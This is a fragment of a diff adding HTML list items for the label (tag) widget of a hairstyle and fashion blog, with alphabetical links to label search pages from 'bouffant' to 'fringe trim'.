+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bouffant'>bouffant</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bouncy%20curls'>bouncy curls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brad%20Pitt'>Brad Pitt</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bradley%20Cooper'>Bradley Cooper</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Braid'>Braid</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Braid%20Hairstyles'>Braid Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/braide'>braide</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/braided%20headband'>braided headband</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Braides'>Braides</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Braids'>Braids</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/breaking%20news'>breaking news</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Breast%20Cancer'>Breast Cancer</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/breast%20cancer%20awareness'>breast cancer awareness</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bridal'>bridal</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bride'>bride</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bridesmaid%20hairstyles'>bridesmaid hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brigitte%20Bardot'>Brigitte Bardot</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brooklyn%20Decker'>Brooklyn Decker</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brown%20hair'>Brown hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brown%20Hairstyles'>Brown Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brown%20Long%20Hair%20Styles%202012'>Brown Long Hair Styles 2012</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brown%20Short%20Haircuts'>Brown Short Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Brunette'>Brunette</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/brunette.'>brunette.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bun'>bun</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bus'>Bus</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bus%20Fire'>Bus Fire</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cameron%20Diaz%20New%20Bob%20Hairstyle'>Cameron Diaz New Bob Hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/canvas'>canvas</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/car'>car</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Carey%20Mulligan'>Carey Mulligan</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Carlos%20Alberto'>Carlos Alberto</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hair'>casual hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles'>casual hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles%20for%20curly%20hair'>casual hairstyles for curly hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles%20for%20long%20hair'>casual hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles%20for%20medium%20length%20hair'>casual hairstyles for medium length hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles%20for%20men'>casual hairstyles for men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/casual%20hairstyles%20pinterest'>casual hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Casual%20Short%20Straight%20Hairstyles'>Casual Short Straight Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrities'>celebrities</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity'>Celebrity</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20color'>celebrity color</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20colour'>celebrity colour</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity%20hair'>Celebrity hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity%20hair.'>Celebrity hair.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyle'>celebrity hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity%20Hairstyles'>Celebrity Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyles%202013'>celebrity hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity%20Hairstyles%20and%20Haircuts'>Celebrity Hairstyles and Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyles%20fall%202013'>celebrity hairstyles fall 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyles%20for%20long%20hair'>celebrity hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyles%20short'>celebrity hairstyles short</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20hairstyles%20with%20bangs'>celebrity hairstyles with bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Celebrity%20Style'>Celebrity Style</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20variant%20hairstyles'>celebrity variant hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20wedding%20hairstyles'>celebrity wedding hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20wedding%20hairstyles%202013'>celebrity wedding hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20wedding%20hairstyles%20pictures'>celebrity wedding hairstyles pictures</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20wedding%20hairstyles%20updos'>celebrity wedding hairstyles updos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/celebrity%20wedding%20hairstyles%20with%20veil'>celebrity wedding hairstyles with veil</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/centre%20part'>centre part</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Chanel'>Chanel</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Charity'>Charity</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Charlestown%20Square'>Charlestown Square</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Chemical%20peel'>Chemical peel</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Choppy'>Choppy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles'>choppy hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles%20for%20long%20hair'>choppy hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles%20for%20medium%20length%20hair'>choppy hairstyles for medium length hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles%20for%20oval%20faces'>choppy hairstyles for oval faces</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles%20pinterest'>choppy hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/choppy%20hairstyles%20with%20bangs'>choppy hairstyles with bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Christina%20Milian'>Christina Milian</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Christmas'>Christmas</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/citrus'>citrus</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/coco'>coco</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Colin%20Farrell'>Colin Farrell</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/collection'>collection</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Color'>Color</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/color%20bug'>color bug</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/color%20palatte'>color palatte</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Colored%20Highlights'>Colored Highlights</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/colour'>colour</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Colour%20Bug'>Colour Bug</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/colour%20change'>colour change</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Colourist'>Colourist</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Competition'>Competition</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/contrast'>contrast</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/cool%20scene%20hairstyles'>cool scene hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/copper'>copper</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/cosmeceutical'>cosmeceutical</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cosmetics'>Cosmetics</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cosmo'>Cosmo</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cotton%20Candy'>Cotton Candy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/cover%20me'>cover me</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/crash'>crash</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/cream'>cream</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/crimson'>crimson</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Crimson%20Envy%20Eye'>Crimson Envy Eye</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/crop'>crop</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curls'>curls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curls%20hairstyles%20for%20long%20hair'>curls hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Curly'>Curly</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Curly%20Afro%20Weave%20Hairstyle%20Pictures'>Curly Afro Weave Hairstyle Pictures</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hair%20styles'>curly hair styles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Curly%20Hair%20with%20Bangs'>Curly Hair with Bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyle'>curly hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Curly%20Hairstyles'>Curly Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyles%202013'>curly hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyles%20for%20men'>curly hairstyles for men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyles%20for%20women'>curly hairstyles for women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyles%20pinterest'>curly hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20hairstyles%20tumblr'>curly hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Curly%20Long%20Blonde%20Hair'>Curly Long Blonde Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/curly%20updo%20hairstyle%20for%20girls'>curly updo hairstyle for girls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/cut'>cut</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cute%20Girl'>Cute Girl</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cute%20Hairstyles%20for%20Brown%20Hair'>Cute Hairstyles for Brown Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Cute%20Short%20Brown%20Hair'>Cute Short Brown Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Daniel%20Radcliffe'>Daniel Radcliffe</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Brown%20Hair%20Colors'>Dark Brown Hair Colors</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Brown%20Hair%20Dye'>Dark Brown Hair Dye</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Brown%20Hair%20Shades'>Dark Brown Hair Shades</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Brown%20Hair%20with%20Highlights'>Dark Brown Hair with Highlights</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Brown%20Hairstyles'>Dark Brown Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dark%20Hairstyles'>Dark Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/David%20Beckham'>David Beckham</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles'>david beckham hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles%202013'>david beckham hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles%20comb%20over'>david beckham hairstyles comb over</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles%20faux%20hawk'>david beckham hairstyles faux hawk</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles%20photos'>david beckham hairstyles photos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/david%20beckham%20hairstyles%20through%20the%20years'>david beckham hairstyles through the years</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Day%20Spa'>Day Spa</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/death'>death</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/definition'>definition</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Diane%20Kruger'>Diane Kruger</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Diane%20Von%20Furstenberg'>Diane Von Furstenberg</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/diet'>diet</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Different%20Natural%20Afro%20Hairstyle%20Photos'>Different Natural Afro Hairstyle Photos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dita%20Von%20Teese'>Dita Von Teese</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dj%20Havana%20Brown'>Dj Havana Brown</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Donna%20Karen'>Donna Karen</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Dress%20to%20Kill%20Magazine'>Dress to Kill Magazine</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/dry%20Shampoo'>dry Shampoo</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/DVF'>DVF</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Easy'>Easy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/eat'>eat</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/editorial'>editorial</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/editorial%20hair'>editorial hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/elegant'>elegant</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/elegant%20glamour'>elegant glamour</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/elegant%20short%20summer%20hairstyle'>elegant short summer hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Eles'>Eles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Eles%20Cosmetics'>Eles Cosmetics</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Elsa%20Hosk'>Elsa Hosk</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emma%20Watson'>Emma Watson</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emmy%20Awards'>Emmy Awards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo'>Emo</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo%20and%20Scene%20Kids'>Emo and Scene Kids</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo%20Anime%20FanArts'>Emo Anime FanArts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20boy'>emo boy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20girl%20hairstyle'>emo girl hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20girl%20hairstyles'>emo girl hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo%20Hair'>Emo Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20haircuts%20for%20men%202013'>emo haircuts for men 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles'>emo hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%202013'>emo hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20girls'>emo hairstyles for girls</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20girls%20long%20hair'>emo hairstyles for girls long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20girls%20short'>emo hairstyles for girls short</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20girls%20tumblr'>emo hairstyles for girls tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20girls%20with%20thick%20hair'>emo hairstyles for girls with thick hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20guys'>emo hairstyles for guys</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20long%20hair'>emo hairstyles for long hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20men'>emo hairstyles for men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20men%202013'>emo hairstyles for men 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20men%202014'>emo hairstyles for men 2014</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20for%20short%20hair'>emo hairstyles for short hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/emo%20hairstyles%20tumblr'>emo hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo%20Photography'>Emo Photography</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Emo%20Subculture'>Emo Subculture</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/engaged'>engaged</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/engagement'>engagement</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Eva%20Longoria'>Eva Longoria</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Evening%20Make%20Up'>Evening Make Up</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/event'>event</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/everyday'>everyday</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Eye'>Eye</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Face%20of'>Face of</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fall%20Out%20Boy'>Fall Out Boy</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fashion'>fashion</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fashion%20Launch'>Fashion Launch</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fashion%20show'>fashion show</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fashion%20Week'>Fashion Week</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fashion.'>fashion.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fast%20and%20furious'>fast and furious</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/faux%20bob'>faux bob</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/favorite%20short%20pixie%20hairstyle'>favorite short pixie hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fierce%20bun'>Fierce bun</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fingerwaves'>Fingerwaves</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fire'>Fire</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fishtail'>Fishtail</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/flirty%20long%20hairstyle'>flirty long hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/floral%20fashion.'>floral fashion.</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/food'>food</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/formal'>formal</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/formal%20bridal%20hairstyle'>formal bridal hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/FREE'>FREE</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/FREESHAPE'>FREESHAPE</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fresh'>fresh</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Fresh%20hair'>Fresh hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fringe'>fringe</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/fringe%20trim'>fringe trim</a>
+</li>
+<li>
